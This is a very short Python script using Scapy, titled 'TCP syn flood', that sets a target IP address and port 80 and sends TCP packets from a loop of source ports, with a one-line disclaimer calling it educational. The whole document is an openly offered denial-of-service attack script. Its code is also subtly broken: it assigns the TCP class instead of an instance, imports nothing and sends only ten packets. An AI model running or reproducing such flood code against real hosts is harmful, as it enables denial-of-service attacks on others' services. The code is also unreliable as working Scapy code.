# TCP syn flood in scapy
# This was for educational purposes and should not be used for malicious purposes
i = IP()
i.dst = "192.168.0.5" #Target IP address
t = TCP
t.dport = 80 #Target -Port

for p in range(1000,1010):
	t.sport = p
	send(i/t)
